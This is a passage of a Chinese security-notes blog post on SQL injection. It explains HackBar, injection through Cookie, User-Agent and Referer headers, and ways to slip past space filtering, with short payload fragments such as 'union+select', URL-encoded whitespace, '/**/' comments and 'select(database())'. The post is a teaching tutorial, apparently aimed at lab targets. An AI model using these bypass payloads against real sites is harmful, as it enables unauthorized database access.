+<p>LoadURL：下载当前网址到hackbar上，这个可以省去复制的麻烦</p>
+<p>Cookie：<br>Cookie值的修改，也是一个注入点，就和输入框一样，可以在这里进行报错或者联合查询的注入（注：前面必须加上id&#x3D;）</p>
+<p>Execute：进行攻击尝试</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image16.jpeg" srcset="/img/loading.gif" lazyload alt="23db8ee3216c5ec6a790786f3eb6656f"><br>height&#x3D;”2.6243055555555554in”}</p>
+<ol start="9">
+<li><p><strong>ua注入点</strong></p>
+<p>定义： UA（<br>User-agent），即用户代理，是浏览器访问网站时发送的&quot;自我介绍&quot;，告诉服务器&quot;我是用什么浏览器访问的&quot;</p>
+<p>Ua注入点存在的原因和cookie注入点一样，即ua可以直接拼接到sql语句中，且不做任何处理</p>
+<p>所以，我们可以通过修改ua的值，来实现攻击的目的</p>
+<p><strong>注入过程：</strong></p>
+<p>和cookie注入点一样，打开hackbar或者使用bp来修改ua的值，并结合报错（主要），联合查询等方式来进行攻击</p>
+<p><img src="/images/notes/media_sql%E6%B3%A8%E5%85%A5/media/image17.jpeg" srcset="/img/loading.gif" lazyload alt="86f6de286c8b73ad160db25a420f1405"><br>height&#x3D;”2.933333333333333in”}</p>
+<p><strong>注：无论是cookie还是ua，referer，先判断类型，如果是数字型的话就不用注释，如果是字符型则需要注释</strong></p>
+</li>
+<li><p><strong>refer注入点</strong></p>
+<p>定义：Referer 是 HTTP<br>请求头中的一个字段，告诉服务器&quot;我是从哪个页面跳转过来的&quot;。</p>
+</li>
+</ol>
+<p>产生refer注入的原因也跟前两者一样，通过直接把refer拼到sql语句中，从而达到攻击的目的</p>
+<p>攻击方式与前两者相同，在hackbar进行攻击</p>
+<ol start="11">
+<li><p><strong>过滤空格</strong></p>
+<p><strong>当目标网站或靶场环境中过滤了空格字符后，我们可以使用以下几种方式来绕过限制：</strong></p>
+<p>**1.**使用+号替代空格：例如，union+select+1,2,3。</p>
+<p>2.URL编码替代：%20（空格）、%09（水平制表符HT）、%0A（换行符LF）、%0C（换页符FF）、%0D（回车CR）、%0B（垂直制表符VT）、%A0（不间断空格NBS）。</p>
+<p>3.使用SQL注释符&#x2F;**&#x2F;替代空格，如：union&#x2F;**&#x2F;select。</p>
+<p>4.括号()替代空格：select(database())。</p>
+<p>5.使用报错注入技巧绕过限制。</p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="category-chain-item">安全笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sql注入</div>
+      <div>https://chiya-66.github.io/2026/11/06/sql注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/10/16/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="实验：内网渗透测试">
+                        <span class="hidden-mobile">实验：内网渗透测试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
